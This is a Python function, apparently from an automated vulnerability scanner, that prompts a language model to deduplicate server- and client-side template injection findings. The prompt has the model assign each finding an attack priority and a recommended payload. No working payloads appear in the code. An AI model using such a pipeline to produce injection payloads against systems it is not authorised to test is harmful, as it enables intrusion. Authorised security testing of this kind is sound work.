    detected_engines = detect_engines_fn(frameworks, tech_tags, lang) if detect_engines_fn else []

    system_prompt = f"""You are an expert CSTI/SSTI deduplication analyst with deep knowledge of template engines.

{csti_prime_directive}

{csti_dedup_context}

## TARGET CONTEXT
- Backend Language: {lang}
- Detected Engines: {', '.join(detected_engines) if detected_engines else 'Unknown'}
- WAF: {waf or 'None detected'}
- Frameworks: {', '.join(frameworks[:3]) if frameworks else 'Unknown'}

Your job is to identify and remove duplicate template injection findings while preserving unique vulnerabilities.
Different template engines represent different attack surfaces - NEVER merge findings with different engines."""

    prompt = f"""Analyze {len(wet_findings)} potential CSTI/SSTI findings.

## WET FINDINGS (may contain duplicates):
{json.dumps(wet_findings, indent=2)}

## TASK
1. Apply engine-based deduplication rules
2. Distinguish CSTI (client-side: Angular, Vue) from SSTI (server-side: Jinja2, Twig)
3. Prioritize findings for detected engines: {detected_engines or ['generic']}
4. Remove true duplicates (same URL + param + engine)
5. IMPORTANT: For client-side engines (Angular, Vue), multiple params on the SAME PAGE share the same scope. Merge them into ONE finding per page per engine (keep the first param as representative)

## OUTPUT FORMAT (JSON only, no markdown):
{{
  "findings": [
    {{
      "url": "...",
      "parameter": "...",
      "template_engine": "jinja2|twig|angular|vue|freemarker|erb|unknown",
      "injection_type": "SSTI|CSTI",
      "rationale": "why unique",
      "attack_priority": 1-5,
      "recommended_payload": "specific payload for this engine"
    }}
  ],
  "duplicates_removed": <count>,
  "reasoning": "Brief deduplication strategy"
}}"""

    try:
        response = await llm_client.generate(
            prompt=prompt,
            system_prompt=system_prompt,
            module_name="CSTI_DEDUP",
            temperature=0.2,
        )

        result = json.loads(response)
        dry_list = result.get("findings", [])

        if dry_list:
            logger.info(f"[CSTI] LLM deduplication: {result.get('reasoning', 'No reasoning')}")
            logger.info(f"[CSTI] LLM deduplication successful: {len(wet_findings)} -> {len(dry_list)}")
            return dry_list
        else:
            logger.warning("[CSTI] LLM returned empty list, using fallback")
            return fallback_fingerprint_dedup(wet_findings)

    except Exception as e:
        logger.warning(f"[CSTI] LLM deduplication failed: {e}, using fallback")
        return fallback_fingerprint_dedup(wet_findings)
